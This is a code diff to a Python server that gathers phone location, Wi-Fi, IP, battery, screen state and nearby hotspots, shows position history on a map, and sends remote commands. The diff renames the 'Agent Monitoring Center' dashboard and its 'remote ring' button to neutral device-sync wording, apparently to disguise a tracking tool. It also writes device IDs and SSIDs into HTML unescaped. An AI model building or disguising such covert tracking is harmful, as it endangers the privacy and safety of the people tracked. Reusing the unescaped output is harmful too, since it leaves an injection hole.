@@ -5,7 +5,7 @@ import threading
 import time
 import sqlite3
 
-PORT = 8080  # 如果冲突请修改
+PORT = 8080  # 如果端口冲突请修改
 AUTH_TOKEN = "your_private_secret_key"
 RESCUE_SECRET = "your_private_secret_key"
 
@@ -91,27 +91,31 @@ def handle_client(client_conn, client_addr):
 
                 loc = data.get('location', {})
                 lat, lng = loc.get('latitude'), loc.get('longitude')
+                
                 if lat is not None and lng is not None:
                     save_history(dev_id, lat, lng, data["received_at"])
 
                 with print_lock:
                     uptime_ms = data.get('uptime_ms', 0)
                     uptime_hours = round(uptime_ms / (1000 * 60 * 60), 1) if uptime_ms else 0
-                    screen_on = "💡亮屏" if data.get('is_screen_on') else "🌑息屏"
+                    screen_on = "亮屏" if data.get('is_screen_on') else "息屏"
                     os_ver = data.get('os_version', 'Unknown')
+                    
+                    # 终端打印也统一保留 6 位小数
+                    loc_str = f"{lat:.6f}, {lng:.6f}" if lat is not None and lng is not None else "未获取"
 
                     print("\n" + "="*50)
-                    print(f"📥 [收到上报] 设备: 【{dev_id}】")
-                    print(f"🤖 状态: {os_ver} | {screen_on} | 已开机 {uptime_hours} 小时")
-                    print(f"📶 Wi-Fi: {data.get('network', {}).get('wifi_ssid')} (IP: {data.get('network', {}).get('local_ip')})")
-                    print(f"🔋 电量: {data.get('battery', {}).get('level')}%")
-                    print(f"📍 定位: {lat}, {lng}")
+                    print(f"收到上报 | 设备: {dev_id}")
+                    print(f"状态: {os_ver} | {screen_on} | 已开机 {uptime_hours} 小时")
+                    print(f"Wi-Fi: {data.get('network', {}).get('wifi_ssid')} (IP: {data.get('network', {}).get('local_ip')})")
+                    print(f"电量: {data.get('battery', {}).get('level')}%")
+                    print(f"定位: {loc_str}")
                     print("="*50)
 
                 response_body = json.dumps({"status": "success", "config": GLOBAL_DEFAULT_CONFIG})
                 client_conn.sendall(f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(response_body)}\r\n\r\n{response_body}".encode('utf-8'))
             except Exception as e: 
-                with print_lock: print(f"❌ 解析异常: {e}")
+                with print_lock: print(f"解析异常: {e}")
 
         # 2. 网页指令控制
         elif "POST /api/control" in request:
@@ -132,11 +136,11 @@ def handle_client(client_conn, client_addr):
                     now_ts = int(datetime.datetime.now().timestamp() * 1000)
                     to_delete = []
                     for k, v in ALL_DEVICES_STATUS.items():
-                        if now_ts - v.get('received_at', 0) > 7200000:
+                        if now_ts - v.get('received_at', 0) > 3600000: 
                             to_delete.append(k)
                     for k in to_delete:
                         del ALL_DEVICES_STATUS[k]
-                    with print_lock: print(f"\n🧹 已清理 {len(to_delete)} 台超时未上报的设备。")
+                    with print_lock: print(f"\n已清理 {len(to_delete)} 台超时未上报的设备。")
                     success = True
 
                 resp = json.dumps({"status": "ok" if success else "error"})
@@ -159,46 +163,70 @@ def handle_client(client_conn, client_addr):
         # 4. 网页 HTML
         elif "GET /" in request:
             html = """<!DOCTYPE html>
-<html><head><meta charset='utf-8'><title>特工监控中心</title>
+<html><head><meta charset='utf-8'><title>终端设备管理</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <style>
 body{font-family:sans-serif;margin:20px;background:#f4f6f9;}
+h2{color:#333;font-size: 20px;}
 .panel{background:#fff;padding:15px;border-radius:8px;margin-bottom:20px;box-shadow:0 2px 4px rgba(0,0,0,0.1);}
-button{padding:6px 12px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;margin-right:10px;}
+button{padding:6px 12px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;margin-right:10px;font-size:14px;}
 button:hover{opacity:0.8;}
 table{border-collapse:collapse;width:100%;background:#fff;}
 th,td{border:1px solid #ddd;padding:10px;text-align:left;font-size:14px;}
 th{background:#f0f0f0;}
+details { cursor: pointer; color: #007bff; }
+ul { margin: 5px 0 0 0; padding-left: 20px; font-size: 12px; color: #555; }
 #map { height: 450px; width: 100%; border-radius: 8px; margin-top: 10px; }
 </style>
 </head>
 <body>
-<h2>🛡️ 特工监控中心</h2>
+<h2>📱 终端设备状态同步中心</h2>
 <div class="panel">
-    <button onclick="sendCmd('force_report')">强制上报</button>
-    <button onclick="sendCmd('play_alarm')" style="background:#dc3545;">🔊 远程响铃</button>
-    <button onclick="sendCmd('clean_offline')" style="background:#6c757d;">🧹 清理离线设备</button>
+    <button onclick="sendCmd('force_report')">同步最新状态</button>
+    <button onclick="sendCmd('play_alarm')" style="background:#dc3545;">测试音频提示</button>
+    <button onclick="sendCmd('clean_offline')" style="background:#6c757d;">清理离线数据</button>
 </div>
 <div class="panel">
     <table>
-        <tr><th>设备ID</th><th>系统 / 状态</th><th>电量</th><th>Wi-Fi</th><th>定位时间</th><th>收到时间</th><th>操作</th></tr>
+        <tr><th>设备ID</th><th>系统 / 状态</th><th>电量</th><th>Wi-Fi</th><th>经纬度</th><th>定位时间</th><th>收到时间</th><th>周围热点</th><th>操作</th></tr>
 """
             for dev_id, info in ALL_DEVICES_STATUS.items():
                 os_ver = info.get('os_version', 'Unknown').replace("Android ", "A")
-                screen_on = "💡亮屏" if info.get('is_screen_on') else "🌑息屏"
+                screen_on = "亮屏" if info.get('is_screen_on') else "息屏"
                 sys_status = f"{os_ver} <br><span style='font-size:12px;color:#888;'>{screen_on}</span>"
                 
+                lat = info.get('location', {}).get('latitude')
+                lng = info.get('location', {}).get('longitude')
+                if lat is not None and lng is not None:
+                    # 【修改点】网页显示统一保留 6 位小数，且带高德地图跳转
+                    coord = f"<a href='https://uri.amap.com/marker?position={lng},{lat}' target='_blank' style='color:#007bff;'>{lat:.6f}, {lng:.6f}</a>"
+                else:
+                    coord = "无定位"
+
+                # 恢复：展开列表查看周围 Wi-Fi
+                nearby = info.get('nearby_wifi', [])
+                ap_list_html = ""
+                if nearby:
+                    ap_list_html = "<details><summary><b>" + str(len(nearby)) + " 个</b></summary><ul>"
+                    for ap in nearby:
+                        ap_list_html += f"<li>{ap.get('ssid')} ({ap.get('rssi')} dBm)</li>"
+                    ap_list_html += "</ul></details>"
+                else:
+                    ap_list_html = "0 个"
+
                 html += f"<tr><td><b>{dev_id}</b></td>"
                 html += f"<td>{sys_status}</td>"
                 html += f"<td>{info.get('battery', {}).get('level', '?')}%</td>"
                 html += f"<td>{info.get('network', {}).get('wifi_ssid', '?')}</td>"
+                html += f"<td>{coord}</td>"
                 html += f"<td>{format_loc_time(info.get('location', {}).get('time', 0))}</td>"
                 html += f"<td>{format_loc_time(info.get('received_at', 0))}</td>"
-                html += f"<td><button onclick=\"showTrack('{dev_id}')\">查看轨迹 & 定位</button></td></tr>"
+                html += f"<td>{ap_list_html}</td>"
+                html += f"<td><button onclick=\"showTrack('{dev_id}')\" style=\"background:#17a2b8;\">历史轨迹</button></td></tr>"
                 
             if not ALL_DEVICES_STATUS:
-                html += "<tr><td colspan='7' align='center'>暂无设备上报</td></tr>"
+                html += "<tr><td colspan='9' align='center'>暂无设备上报</td></tr>"
 
             html += """</table></div>
 <div id="map"></div>
@@ -254,7 +282,7 @@ def start_server():
     server.listen(20)
     with print_lock:
         print("="*50)
-        print(f"🚀 终极控制中心已启动: http://{get_local_ip()}:{PORT}")
+        print(f"🚀 设备同步服务已启动: http://{get_local_ip()}:{PORT}")
         print("="*50)
 
     while True:
